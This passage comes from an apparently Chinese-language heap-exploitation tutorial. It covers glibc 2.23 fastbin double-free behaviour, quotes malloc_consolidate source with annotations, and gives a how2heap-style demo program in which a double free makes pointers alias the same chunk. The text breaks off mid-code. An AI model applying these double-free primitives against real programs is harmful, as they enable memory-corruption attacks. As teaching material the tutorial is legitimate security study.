operator\">=</span> <span class=\"token string\">\"double free or corruption (fasttop)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t    <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>glibc2.23 对于 double free 的管理非常地松散，如果连续释放相同 chunk 的时候，会报错，但是如果隔块释放的话，就没有问题。在 glibc2.27 及以后的 glibc 版本中，加入了 tcache 机制，加强了对 use after free 的检测，所以 glibc2.23 中针对 fastbin 的 uaf 在 glibc2.27 以后，就失效了</p>\n<p>此时 fastbin 中的结构是：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/WF329P8%5D2Q%5BJ%7DQDT%7E%28J7V0D.png\" alt=\"\" /></p>\n<p><code>fastbin-&gt;chunk a(新释放的)-&gt;chunk b-&gt;chunk a</code> 【fastbin 是单项链表】</p>\n<h3 id=\"执行到第31行\"><a class=\"anchor\" href=\"#执行到第31行\">#</a> 执行到第 31 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>查看堆情况：</p>\n<p>看起来和没有执行 <code>a=malloc(8)</code>  一样：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/_%60XZL5C%40%7E8SL2S3Z%5D1TIPWY.png\" alt=\"\" /></p>\n<p>但是查看 fastbin 就有区别了：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/2JQ%280MU7%24T%7B%28%29MO3S917%7D7S.png\" alt=\"\" /></p>\n<p>现在变成了 <code>fastbin-&gt;chunk b-&gt;chunk a</code></p>\n<h3 id=\"执行32行b-malloc8\"><a class=\"anchor\" href=\"#执行32行b-malloc8\">#</a> 执行 32 行 <code>b = malloc(8);</code></h3>\n<p>这里已经摘除 chunk b, 所以 fastbin 指向了 chunk a，而这里又发现 chunk a 又指向了 chunk b，初步认为是在前面 malloc (a), 没有将 fd 置空，</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/74H%7D%29PY8UZ%286_720HNY8G1W.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/R%24L90CG5%60%251B937WEQ%5D_UQY.png\" alt=\"\" /></p>\n<h3 id=\"执行33行cmalloc8\"><a class=\"anchor\" href=\"#执行33行cmalloc8\">#</a> 执行 33 行 <code>c=malloc(8)</code></h3>\n<p>这里符合猜想，a、b 两个 chunk 的 fd 互相指向对方，而切再申请后没有清空，就导致了无限循环</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/M%40X%60I%29B23F1UD%7EQE%5B03%5D%7DJV.png\" alt=\"\" /></p>\n<p>接下来仍然和之前一样：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/%28VOQZ1FQ%5DC5M6OBQD7E%29%296G.png\" alt=\"\" /></p>\n<h3 id=\"执行到程序结束\"><a class=\"anchor\" href=\"#执行到程序结束\">#</a> 执行到程序结束</h3>\n<p>程序运行结果：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/%5DYUNR9PY%29S%60%254EU%7E15%7E_N91.png\" alt=\"\" /></p>\n<p>这里也符合预期，第一次和第三次指向同一个 chun a</p>\n<p>注意【 <code>fastbin链表的存放的chunk头指针，都存储在堆中名为arena的空间的，直接用dq &amp;main_arena 20查看</code> 】</p>\n<h1 id=\"2fastbin_dup_consolidate\"><a class=\"anchor\" href=\"#2fastbin_dup_consolidate\">#</a> 2. <code>fastbin_dup_consolidate</code></h1>\n<p>介绍了 double free 的合并行为，在 <code>fastbin</code>  不为空时申请一个 <code>largebin</code>  会使这个 fastbin 进行合并（这里与 top chunk 合并，并且直接释放满足 fastbin 的 chunk 是不会与 <code>top chunk</code>  合并的），指针没有被置空的情况，可以利用前面释放的指针再次释放第二次申请的指针，导致我们第首次申请时，三个指针指向同一个 chunk</p>\n<p>这个漏洞，使得我们可以通过其他的指针来修改同一个 chunk 从而被我们利用（或许可以绕过某些检测）</p>\n<h2 id=\"利用mallocconsolidate函数\"><a class=\"anchor\" href=\"#利用mallocconsolidate函数\">#</a> 利用 malloc.consolidate 函数</h2>\n<p>glibc2.23 源码 (4108-4218 行)：</p>\n<p>在 glibc2.23 中当 fasbin 中有 chunk 存在，申请一个 largebin 范围的 chunk，就执行该函数（再 <code>_int_malloc()</code>  3447 行会再分配 largebin 时执行该函数，会将 fastbin 先看该 chunk 是否紧挨着 <code>top chunk</code>  不紧挨着就转移到 <code>unsortedbin</code>  中，malloc 函数会在 unsortedbin 查询符合大小的 chunk，发现新转移来的 chunk，判断这些 chunk 是否符合 smallbin 的大小，如果符合 smallbin，就加入到 smallbin 中，否则就到 largebin 中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  ------------------------- malloc_consolidate -------------------------</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  malloc_consolidate is a specialized version of free() that tears</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  down chunks held in fastbins.  Free itself cannot be used for this</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  purpose since, among other things, it might place chunks back onto</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  fastbins.  So, instead, we need to use a minor variant of the same</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  code.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  Also, because this routine needs to be called the first time through</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  malloc anyway, it turns out to be the perfect place to trigger</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  initialization code.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    If max_fast is 0, we know that av hasn't</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    yet been initialized, in which case do so below</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  */</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_max_fast</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">clear_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      reused anyway.</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t  <span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t  nextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t  <span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  size <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>PREV_INUSE<span class=\"token operator\">|</span>NON_MAIN_ARENA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t  nextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t  nextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 判断向前合并</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t    prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t    p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 不紧挨着 topchunk</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t      size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t      <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t    first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 插入到 unstored_bin 中</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t    unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t    first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 不符合 smallbin 的范围进入 largebin</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t      p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t      p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t    <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t    <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 下一个 chunk 为 top chunk</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t    <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t    av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token function\">malloc_init_state</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 初始化</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token function\">check_malloc_state</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is a powerful technique that bypasses the double free check in tcachebin.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fill up the tcache list to force the fastbin usage...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> p1 <span class=\"token operator\">=</span> <span class=\"token function\">calloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 先分配一个小的 chunk</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocate another chunk of the same size p1=%p \\n\"</span><span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Freeing p1 will add this chunk to the fastbin list...\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 释放进入 fastbin</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 分配一个大的 chunk，小的如果紧挨着 topchunk 就与 top chunk 合并</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocating a tcache-sized chunk (p3=%p)\\n\"</span><span class=\"token punctuation\">,</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"will trigger the malloc_consolidate and merge\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the fastbin chunks into the top chunk, thus\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p1 and p3 are now pointing to the same chunk !\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>p1 <span class=\"token operator\">==</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Triggering the double free vulnerability!\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 释放这个 largebin</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>p4 <span class=\"token operator\">==</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The double free added the chunk referenced by p1 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"to the tcache thus the next similar-size malloc will\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"point to p3: p3=%p, 